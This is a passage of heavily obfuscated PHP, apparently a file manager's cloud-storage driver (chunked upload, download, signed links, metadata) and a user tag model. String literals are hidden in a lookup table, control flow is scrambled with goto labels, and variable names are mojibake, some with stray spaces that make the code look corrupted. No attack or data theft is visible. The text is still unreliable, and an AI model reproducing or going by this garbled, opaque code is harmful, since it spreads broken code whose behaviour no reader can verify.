$BÉÁØæ„‚¤, $BÁˆ¨’÷¤») { $E–Ù±ÎÏš¾ =& $_SERVER[£ü]; if (!($bò‘Ñ·¹¬  = $this->link($A‹”õ‘Çøõ))) { return !1; } $b˜µÊĞãƒ¯ = !1; if ($BÁˆ¨’÷¤» > 0) { $e‹ÍÉ›¾²‘ = $BÉÁØæ„‚¤ + $BÁˆ¨’÷¤» - 1; $b˜µÊĞãƒ¯ = array($E–Ù±ÎÏš¾[1202] . $BÉÁØæ„‚¤ . $E–Ù±ÎÏš¾[408] . $e‹ÍÉ›¾²‘); } $F¸Åë„ŒÂœ = url_request($bò‘Ñ·¹¬ , $E–Ù±ÎÏš¾[213], !1, $b˜µÊĞãƒ¯); return $F¸Åë„ŒÂœ[$E–Ù±ÎÏš¾[678]] ? $F¸Åë„ŒÂœ[$E–Ù±ÎÏš¾[1024]] : !1; } public function upload($D¸íÇÍÅŠ, $aªŒà‹ô±¸, $Cá²‚ïŞ‹İ = false, $D“ˆ•ÆŸ£† = REPEAT_REPLACE) { goto e®©ÕäŒÉÎ; D²¿’Ğó¹‰: $D“˜·¹¬Õ… = array($eĞ¤³²ß[1249], $eĞ¤³²ß[1250] . $E®ø¸œ¥î[$eĞ¤³²ß[1251]], $eĞ¤³²ß[1245]); $cĞ’¶¸ØÆÍ = $this->ussRequest($D¸íÇÍÅŠ, $eĞ¤³²ß[211], !1, $D“˜·¹¬Õ…); return $cĞ’¶¸ØÆÍ[$eĞ¤³²ß[1022]] ? $this->getPathOuter($b½ãÌ²ôèŸ) : !1; goto d»¿Œ÷ÎÒ˜; E®¥¯„š©ƒ: if (!$F¥Ş´ŒøÕÅ) { return !1; } do { $Bé·´Í¼˜Š = $E®ø¸œ¥î[$eĞ¤³²ß[1248]]; fseek($F¥Ş´ŒøÕÅ, $B‹µÎÂÏ¿); $C‰»¢™Æ˜ = fread($F¥Ş´ŒøÕÅ, $Bé·´Í¼˜Š); $f¸ÒÕÈ¶Ü‰ = 0; do { $f¸ÒÕÈ¶Ü‰++; $E®ø¸œ¥î = $this->uploadPart($D¸íÇÍÅŠ, $E®ø¸œ¥î, $C‰»¢™Æ˜); } while (!$E®ø¸œ¥î && $f¸ÒÕÈ¶Ü‰ < 3); if (!$E®ø¸œ¥î) { return !1; } $d½Ù‹ğ = $E®ø¸œ¥î[$eĞ¤³²ß[1247]]; $B‹µÎÂÏ¿ += $Bé·´Í¼˜Š; } while ($d½Ù‹ğ != -1); fclose($F¥Ş´ŒøÕÅ); goto D²¿’Ğó¹‰; e–Úãß®ğ¤: $B‹µÎÂÏ¿ = 0; $d½Ù‹ğ = $E®ø¸œ¥î[$eĞ¤³²ß[1247]]; $F¥Ş´ŒøÕÅ = fopen($aªŒà‹ô±¸, $eĞ¤³²ß[1152]); goto E®¥¯„š©ƒ; D¢ÉêÖÏ’: $cĞ’¶¸ØÆÍ = $this->ussRequest($D¸íÇÍÅŠ, $eĞ¤³²ß[211], !1, $D“˜·¹¬Õ…); if (!$cĞ’¶¸ØÆÍ[$eĞ¤³²ß[1022]]) { return !1; } $E®ø¸œ¥î = $cĞ’¶¸ØÆÍ[$eĞ¤³²ß[1024]]; goto e–Úãß®ğ¤; A•ø˜¹×”¡: $CíŠ¸‹££ñ = $this->osChunkSize(); if ($CíŠ¸‹££ñ > 1024 * 1024 * 10) { $CíŠ¸‹££ñ = 1024 * 1024 * 10; } $D“˜·¹¬Õ… = array($eĞ¤³²ß[1243], $eĞ¤³²ß[1244] . $C¨¬è¤ï’ˆ, $eĞ¤³²ß[1245], $eĞ¤³²ß[1246] . $CíŠ¸‹££ñ); goto D¢ÉêÖÏ’; e®©ÕäŒÉÎ: $eĞ¤³²ß =& $_SERVER[£ü]; $C¨¬è¤ï’ˆ = IO::size($aªŒà‹ô±¸); if ($C¨¬è¤ï’ˆ <= 1024 * 1024 * 200) { $FÃêÃéíœÙ = array($eĞ¤³²ß[1242] . $aªŒà‹ô±¸); $cĞ’¶¸ØÆÍ = $this->ussRequest($D¸íÇÍÅŠ, $eĞ¤³²ß[211], $FÃêÃéíœÙ); return $cĞ’¶¸ØÆÍ[$eĞ¤³²ß[1022]] ? $this->getPathOuter($D¸íÇÍÅŠ) : !1; } goto A•ø˜¹×”¡; d»¿Œ÷ÎÒ˜: } private function uploadPart($aã„àÄÚÄ„, $Aóä‚ô‹ç, &$câ–²Íä”ç) { $fƒ“Ÿ¨Ú„ç =& $_SERVER[£ü]; $CÙì…ä²•İ = array($fƒ“Ÿ¨Ú„ç[1252], $fƒ“Ÿ¨Ú„ç[1250] . $Aóä‚ô‹ç[$fƒ“Ÿ¨Ú„ç[1251]], $fƒ“Ÿ¨Ú„ç[1253] . $Aóä‚ô‹ç[$fƒ“Ÿ¨Ú„ç[1247]], $fƒ“Ÿ¨Ú„ç[1254] . $Aóä‚ô‹ç[$fƒ“Ÿ¨Ú„ç[1248]]); $EåÒÇÏ²±„ = $this->ussRequest($aã„àÄÚÄ„, $fƒ“Ÿ¨Ú„ç[211], $câ–²Íä”ç, $CÙì…ä²•İ); return !$EåÒÇÏ²±„[$fƒ“Ÿ¨Ú„ç[1022]] ? $EåÒÇÏ²±„[$fƒ“Ÿ¨Ú„ç[1022]] : $EåÒÇÏ²±„[$fƒ“Ÿ¨Ú„ç[1024]]; } public function uploadFormData($AÌ™óÑŒ, $bÌ×ôÚ¼ñ½ = 3600) { return $this->uploadPolicy($AÌ™óÑŒ, $bÌ×ôÚ¼ñ½); } public function multiUploadFormData($E©¶«ì«öƒ, $b“Ò‰‡¨ = 3600) { $C“óìÄÀ³ =& $_SERVER[£ü]; $e—‘ä™Î÷ = (int) $GLOBALS[$C“óìÄÀ³[7]][$C“óìÄÀ³[77]]; return $this->uploadPolicy($E©¶«ì«öƒ, $b“Ò‰‡¨, $e—‘ä™Î÷); } private function uploadPolicy($a™èÁ¤Ú»Û, $B«Ğ®ññÛ… = 3600, $dÆ‚µ‚¢Î÷ = 0) { goto F¯ë¢Ú; F¯ë¢Ú: $FâÊŞ÷•â =& $_SERVER[£ü]; $a“‘§”›¿ = $FâÊŞ÷•â[8] . $this->bucket; $bäƒ·‡ÀÚ = gmdate($FâÊŞ÷•â[1187]); goto bˆ½¶°Ã÷; bˆ½¶°Ã÷: $D¡ø¢­‹ÒË = array($FâÊŞ÷•â[1255] => $this->bucket, $FâÊŞ÷•â[1256] => $a™èÁ¤Ú»Û, $FâÊŞ÷•â[1257] => time() + $B«Ğ®ññÛ…, $FâÊŞ÷•â[1258] => $bäƒ·‡ÀÚ); if ($dÆ‚µ‚¢Î÷) { $D¡ø¢­‹ÒË[$FâÊŞ÷•â[1173]] = $dÆ‚µ‚¢Î÷; } $a¨œì³öÒò = base64_encode(json_encode($D¡ø¢­‹ÒË)); goto e­Ó“Ÿ×‹­; e­Ó“Ÿ×‹­: $c·ÆóÍàß« = base64_encode(hash_hmac($FâÊŞ÷•â[1224], "\x50\x4f\x53\x54\46{$a“‘§”›¿}\46{$bäƒ·‡ÀÚ}\x26{$a¨œì³öÒò}", md5("{$this->userpass}"), !0)); $CƒâÚÅÕÔ = array($FâÊŞ÷•â[1095] => $a¨œì³öÒò, $FâÊŞ÷•â[1259] => "\x55\120\x59\x55\116\40{$this->username}\x3a{$c·ÆóÍàß«}", $FâÊŞ÷•â[166] => $this->endpoint . $a“‘§”›¿); return $CƒâÚÅÕÔ; goto CÅÒØ¯óØÆ; CÅÒØ¯óØÆ: } public function download($cÎâ‰ÍÈ, $A‡æ¸¶§Ò£) { goto Eì¡ˆªœšœ; Eì¡ˆªœšœ: $Bµ¸‡º¯°Ø = IO::getPathInner(IO::mkfile($A‡æ¸¶§Ò£)); if (!($DªÌ‡¶©ÒÃ = $this->link($cÎâ‰ÍÈ))) { return !1; } $D¢´õ›ëØß = 0; goto F¢Æ×õë; Aß¦¢ã¶¿: fclose($a£¹Œ¾ïÄó); return $A‡æ¸¶§Ò£; goto Fä±Ìê ¸; F¢Æ×õë: $AëµÓ¹Ò‹ = 1024 * 200; $a£¹Œ¾ïÄó = fopen($Bµ¸‡º¯°Ø, $_SERVER[£ü][1208]); while (!0) { $d® ¾æö = $this->fileSubstr($cÎâ‰ÍÈ, $D¢´õ›ëØß, $AëµÓ¹Ò‹); if ($d® ¾æö === !1) { return !1; } fwrite($a£¹Œ¾ïÄó, $d® ¾æö); $D¢´õ›ëØß += $AëµÓ¹Ò‹; if (strlen($d® ¾æö) < $AëµÓ¹Ò‹) { break; } } goto Aß¦¢ã¶¿; Fä±Ìê ¸: } public function link($EÜŒ‰÷Ë, $dŸÁšÜ©ô‹ = array()) { $DäÓÕº˜ÃÛ =& $_SERVER[£ü]; $EÜŒ‰÷Ë = trim($EÜŒ‰÷Ë, $DäÓÕº˜ÃÛ[8]); if (!empty($this->token)) { $cìÇ™Ø´ = strtotime(date($DäÓÕº˜ÃÛ[1260])); $CöÓ‡ôå = substr(md5($this->token . $DäÓÕº˜ÃÛ[269] . $cìÇ™Ø´ . $DäÓÕº˜ÃÛ[1261] . $EÜŒ‰÷Ë), 12, 8) . $cìÇ™Ø´; $dŸÁšÜ©ô‹[] = $DäÓÕº˜ÃÛ[1262] . $CöÓ‡ôå; } $fÕåÔâ­‡Ñ = !empty($dŸÁšÜ©ô‹) ? $DäÓÕº˜ÃÛ[69] . implode($DäÓÕº˜ÃÛ[269], $dŸÁšÜ©ô‹) : $DäÓÕº˜ÃÛ[33]; return $DäÓÕº˜ÃÛ[1098] . $this->domain . $DäÓÕº˜ÃÛ[8] . $EÜŒ‰÷Ë . $fÕåÔâ­‡Ñ; } public function fileOut($CäŸÛÁè¬, $b“÷’¨ÂÌ¢ = false, $F‚»™Õ¤ = false, $C†¬‡‡Äèä = '') { if (!$F‚»™Õ¤) { $F‚»™Õ¤ = $this->pathThis($CäŸÛÁè¬); } $e®áÒ‰÷µ¯ = $b“÷’¨ÂÌ¢ ? array($_SERVER[£ü][1263] . rawurlencode($F‚»™Õ¤)) : array(); $eâ†…Ñ¸Æƒ = $this->link($CäŸÛÁè¬, $e®áÒ‰÷µ¯); $this->fileOutLink($eâ†…Ñ¸Æƒ); } public function fileOutServer($Dç´Î‰µå, $B’Í½è‘¥â = false, $AÉ±²£ß¢° = false, $E–…Ğéá…™ = '') { parent::fileOut($Dç´Î‰µå, $B’Í½è‘¥â, $AÉ±²£ß¢°, $E–…Ğéá…™); } public function fileOutImage($eöåÚ¨É°¶, $CÓàõæÎÑ = 250) { $d±¨„ÊßŸµ = $this->link($eöåÚ¨É°¶ . $_SERVER[£ü][1264] . $CÓàõæÎÑ); $this->fileOutLink($d±¨„ÊßŸµ); } public function fileOutImageServer($a¿ˆŸ÷ö…, $B¬‰±—ñ¬Ú = 250) { parent::fileOutImage($a¿ˆŸ÷ö…, $B¬‰±—ñ¬Ú); } public function hashMd5($eõµ›òËİ) { $AßŠ™…ùë  =& $_SERVER[£ü]; $A ë³Š··µ = $this->objectMeta($eõµ›òËİ); return isset($A ë³Š··µ[$AßŠ™…ùë [193]]) ? $A ë³Š··µ[$AßŠ™…ùë [193]] : !1; } public function size($B¨»š™À¥) { $eß­Ÿ¹ŒœÔ = $this->objectMeta($B¨»š™À¥); return $eß­Ÿ¹ŒœÔ ? $eß­Ÿ¹ŒœÔ[$_SERVER[£ü][77]] : 0; } public function info($a±ÇØ¢¹³) { if ($this->isFolder($a±ÇØ¢¹³)) { return $this->folderInfo($a±ÇØ¢¹³); } else { if ($this->isFile($a±ÇØ¢¹³)) { return $this->fileInfo($a±ÇØ¢¹³); } } return !1; } public function exist($däùÓ‚Ò’“) { return $this->isFile($däùÓ‚Ò’“) || $this->isFolder($däùÓ‚Ò’“); } public function isFile($fä£Á´‚…Ÿ) { return !$this->isFolder($fä£Á´‚…Ÿ) && $this->objectMeta($fä£Á´‚…Ÿ); } public function isFolder($eŸºÆäó¨Ò) { return $this->cacheMethod($_SERVER[£ü][220], $eŸºÆäó¨Ò); } protected function objectMeta($fÛ·ìæÉª) { return $this->cacheMethod($_SERVER[£ü][221], $fÛ·ìæÉª); } protected function _objectMeta($c§í¶Æ×…İ) { goto fÚÌáŒí±á; fÚÌáŒí±á: $Dõ»Ê‰—‚® =& $_SERVER[£ü]; if ($c§í¶Æ×…İ == $Dõ»Ê‰—‚®[33] || $c§í¶Æ×…İ == $Dõ»Ê‰—‚®[8]) { return array(); } $D¢¥ôÖ‹Ó = $this->ussRequest($c§í¶Æ×…İ, $Dõ»Ê‰—‚®[1265]); goto e½òéš•‰; fäğæí±š‰: $Dä¹÷µ‚ªŒ = array($Dõ»Ê‰—‚®[28] => get_path_this($c§í¶Æ×…İ), $Dõ»Ê‰—‚®[29] => isset($cŒ¿õÂ§ë[$Dõ»Ê‰—‚®[1266]]) ? $cŒ¿õÂ§ë[$Dõ»Ê‰—‚®[1266]] : null, $Dõ»Ê‰—‚®[77] => isset($cŒ¿õÂ§ë[$Dõ»Ê‰—‚®[1267]]) ? $cŒ¿õÂ§ë[$Dõ»Ê‰—‚®[1267]] : null, $Dõ»Ê‰—‚®[193] => isset($cŒ¿õÂ§ë[$Dõ»Ê‰—‚®[1268]]) ? $cŒ¿õÂ§ë[$Dõ»Ê‰—‚®[1268]] : null, $Dõ»Ê‰—‚®[1235] => isset($cŒ¿õÂ§ë[$Dõ»Ê‰—‚®[1269]]) ? $cŒ¿õÂ§ë[$Dõ»Ê‰—‚®[1269]] : null); $Dä¹÷µ‚ªŒ[$Dõ»Ê‰—‚®[1236]] = isset($cŒ¿õÂ§ë[$Dõ»Ê‰—‚®[1270]]) ? strtotime($cŒ¿õÂ§ë[$Dõ»Ê‰—‚®[1270]]) : $Dä¹÷µ‚ªŒ[$Dõ»Ê‰—‚®[1235]]; return $Dä¹÷µ‚ªŒ; goto dìŠë‰†‘²; e½òéš•‰: if (!$D¢¥ôÖ‹Ó[$Dõ»Ê‰—‚®[1022]]) { return null; } $cŒ¿õÂ§ë = isset($D¢¥ôÖ‹Ó[$Dõ»Ê‰—‚®[1024]]) ? $D¢¥ôÖ‹Ó[$Dõ»Ê‰—‚®[1024]] : array(); if (!isset($cŒ¿õÂ§ë[$Dõ»Ê‰—‚®[1266]])) { return null; } goto fäğæí±š‰; dìŠë‰†‘²: } protected function _isFolder($b¾ĞÀíÎÏ) { $d›öÔ¬£ï =& $_SERVER[£ü]; if ($b¾ĞÀíÎÏ == $d›öÔ¬£ï[33] || $b¾ĞÀíÎÏ == $d›öÔ¬£ï[8]) { return !0; } $fĞ›¢ËÙµ = $this->objectMeta($b¾ĞÀíÎÏ); return isset($fĞ›¢ËÙµ[$d›öÔ¬£ï[29]]) && $fĞ›¢ËÙµ[$d›öÔ¬£ï[29]] == $d›öÔ¬£ï[76] ? !0 : !1; } } goto a…é½ó‰Õ; AØí¦¼áÈ£: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\145\162\x5f\x66\x61\166"; protected function cacheFunctionAlias($BÍ¾ˆŠç) { $CÊå±ƒÃŒ‚ =& $_SERVER[£ü]; return array($CÊå±ƒÃŒ‚[2437] => array(USER_ID, $CÊå±ƒÃŒ‚[2493])); } protected function listData() { $bÏíŠÜèÂ =& $_SERVER[£ü]; $c«ÈÄæÃÑ¤ = array($bÏíŠÜèÂ[1392] => USER_ID, $bÏíŠÜèÂ[432] => array($bÏíŠÜèÂ[2494], 0)); $CçØø‘¾µÖ = $bÏíŠÜèÂ[2495]; $fµÒ¨‡å = $bÏíŠÜèÂ[2496]; $BÚ…Ğô‰Œ… = $this->field($CçØø‘¾µÖ)->where($c«ÈÄæÃÑ¤)->order($fµÒ¨‡å)->select(); return $BÚ…Ğô‰Œ… ? $BÚ…Ğô‰Œ… : array(); } protected function listByTag($D¢°£´Šôî) { } protected function addToTag($F±Ö»–ñ…Œ, $bœ¼–òç—) { $eÍÊØëŸš° =& $_SERVER[£ü]; if (!Model($eÍÊØëŸš°[2264])->listData($bœ¼–òç—) || !Model($eÍÊØëŸš°[748])->pathInfo($F±Ö»–ñ…Œ)) { return !1; } $bÚÆõ—á»¦ = array($eÍÊØëŸš°[1392] => USER_ID, $eÍÊØëŸš°[432] => $bœ¼–òç—, $eÍÊØëŸš°[384] => $F±Ö»–ñ…Œ, $eÍÊØëŸš°[385] => $eÍÊØëŸš°[379], $eÍÊØëŸš°[383] => $eÍÊØëŸš°[33], $eÍÊØëŸš°[2068] => 0); if ($this->where($bÚÆõ—á»¦)->find()) { return !1; } return $this->add($bÚÆõ—á»¦); } protected function removeFromTag($F”ß‹™“šË, $cë·¯éÖÙ¬) { $Dõ½¾ñ±—Œ =& $_SERVER[£ü]; if (!Model($Dõ½¾ñ±—Œ[2264])->listData($cë·¯éÖÙ¬) || !Model($Dõ½¾ñ±—Œ[748])->pathInfo($F”ß‹™“šË)) { return !1; } $F´ğ›Â’ã° = array($Dõ½¾ñ±—Œ[1392] => USER_ID, $Dõ½¾ñ±—Œ[432] => $cë·¯éÖÙ¬, $Dõ½¾ñ±—Œ[385] => $Dõ½¾ñ±—Œ[379], $Dõ½¾ñ±—Œ[384] => $F”ß‹™“šË); return $this->where($F´ğ›Â’ã°)->delete(); } protected function removeByTag($eĞ²ºÑ®«) { $f³Æ»äù‚– =& $_SERVER[£ü]; if (!$eĞ²ºÑ®«) { return !1; } $CĞÜ»öÌí– = array($f³Æ»äù‚–[1392] => USER_ID, $f³Æ»äù‚–[432] => $eĞ²ºÑ®«); return $this->where($CĞÜ»öÌí–)->delete(); } protected function removeBySource($fñ–—Œ¥) { $DÄÌšÀÑé‰ =& $_SERVER[£ü]; $Bô¾¦Ú»„¿ = array($DÄÌšÀÑé‰[1392] => USER_ID, $DÄÌšÀÑé‰[384] => $fñ–—Œ¥, $DÄÌšÀÑé‰[432] => array($DÄÌšÀÑé‰[918], 0)); return $this->where($Bô¾¦Ú»„¿)->delete(); } }